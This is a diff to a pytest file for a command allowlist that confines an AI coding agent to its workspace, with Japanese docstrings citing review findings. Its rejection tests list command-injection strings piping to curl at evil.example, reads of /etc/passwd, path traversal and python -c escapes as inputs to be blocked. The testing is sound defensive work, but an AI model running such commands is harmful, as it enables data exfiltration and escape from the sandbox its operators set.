@@ -17,10 +17,13 @@ def _ctx(workspace: Path) -> policy.PolicyContext:
 class TestIsAllowedCommand:
     @pytest.mark.parametrize(
         "command",
-        ["ls", "ls -la", "cat foo.txt", "grep bar baz.txt", "python script.py"],
+        ["ls", "ls -la", "cat foo.txt", "grep bar baz.txt"],
     )
-    def test_allows_whitelisted_commands(self, command: str) -> None:
-        assert policy.is_allowed_command(command) is True
+    def test_allows_whitelisted_commands_with_bare_args(
+        self, tmp_path: Path, command: str
+    ) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command(command, workspace) is True
 
     @pytest.mark.parametrize(
         "command",
@@ -34,22 +37,87 @@ class TestIsAllowedCommand:
             "ls | curl http://evil.example",
             "ls `curl http://evil.example`",
             "ls $(curl http://evil.example)",
+            "ls\ncurl http://evil.example",
+            "ls\rcurl http://evil.example",
             "",
             "   ",
         ],
     )
-    def test_rejects_non_whitelisted_or_chained_commands(self, command: str) -> None:
-        assert policy.is_allowed_command(command) is False
+    def test_rejects_non_whitelisted_or_chained_commands(
+        self, tmp_path: Path, command: str
+    ) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command(command, workspace) is False
 
-    def test_rejects_whitelisted_binary_invoked_via_absolute_path_trick(self) -> None:
+    def test_rejects_whitelisted_binary_invoked_via_absolute_path_trick(
+        self, tmp_path: Path
+    ) -> None:
         """先頭コマンド名(basename)だけを見るため、実行ファイル名自体が
 
         ホワイトリスト外であれば拒否される(`/usr/bin/curl`はcurlなので拒否)。
         """
-        assert policy.is_allowed_command("/usr/bin/curl http://evil.example") is False
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert (
+            policy.is_allowed_command("/usr/bin/curl http://evil.example", workspace)
+            is False
+        )
 
-    def test_rejects_malformed_quoting(self) -> None:
-        assert policy.is_allowed_command("ls 'unterminated") is False
+    def test_rejects_malformed_quoting(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("ls 'unterminated", workspace) is False
+
+    def test_allows_python_script_inside_workspace(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        workspace.mkdir(parents=True)
+        script = workspace / "scratch" / "run.py"
+
+        assert policy.is_allowed_command(f"python {script}", workspace) is True
+
+    def test_denies_python_inline_code_execution(self, tmp_path: Path) -> None:
+        """#45 Gate2レビュー指摘・1巡目 HIGH: `-c`は実行ファイル名の
+
+        ホワイトリスト判定だけでは検出できず、事実上任意コード実行の抜け道
+        になっていた。
+        """
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command('python -c "import os"', workspace) is False
+
+    def test_denies_python_interactive_mode(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("python -i", workspace) is False
+
+    def test_denies_python_module_flag(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("python -m http.server", workspace) is False
+
+    def test_denies_bare_python_repl(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("python", workspace) is False
+
+    def test_denies_python_script_outside_workspace(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        outside_script = tmp_path / "elsewhere" / "run.py"
+
+        assert policy.is_allowed_command(f"python {outside_script}", workspace) is False
+
+    def test_denies_cat_reading_outside_workspace(self, tmp_path: Path) -> None:
+        """#45 Gate2レビュー指摘・1巡目 HIGH: 引数を検証しないと
+
+        `cat`/`grep`/`ls`がworkspace外の任意ファイル読み取りに使えてしまう。
+        """
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("cat /etc/passwd", workspace) is False
+
+    def test_denies_ls_traversal_outside_workspace(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        assert policy.is_allowed_command("ls ../../etc", workspace) is False
+
+    def test_allows_cat_reading_inside_workspace(self, tmp_path: Path) -> None:
+        workspace = tmp_path / "agent_workspace" / "run1"
+        workspace.mkdir(parents=True)
+        target = workspace / "scratch" / "notes.txt"
+
+        assert policy.is_allowed_command(f"cat {target}", workspace) is True
 
 
 class TestWithinWorkspace:
@@ -274,12 +342,22 @@ class TestBuildClaudeHooks:
 
 
 class TestBuildOpencodeToolsConfig:
-    def test_returns_dict_disabling_dangerous_tools(self) -> None:
+    def test_enables_bash_write_edit_matching_claude_side_intent(self) -> None:
+        """#45 Gate2レビュー指摘・1巡目 MIDDLE: 一律Falseで全無効化すると
+
+        OpenCode版エージェントが一切作業できず、Claude側(ホワイトリスト
+        準拠のBashとworkspace内Write/Editを許可)と挙動が乖離してしまう。
+        """
         config = policy.build_opencode_tools_config()
 
-        assert config["tools"]["bash"] is False
-        assert config["tools"]["write"] is False
-        assert config["tools"]["edit"] is False
+        assert config["tools"]["bash"] is True
+        assert config["tools"]["write"] is True
+        assert config["tools"]["edit"] is True
+
+    def test_disables_network_tool(self) -> None:
+        config = policy.build_opencode_tools_config()
+
+        assert config["tools"]["webfetch"] is False
 
 
 class TestExceedsTokenBudget:
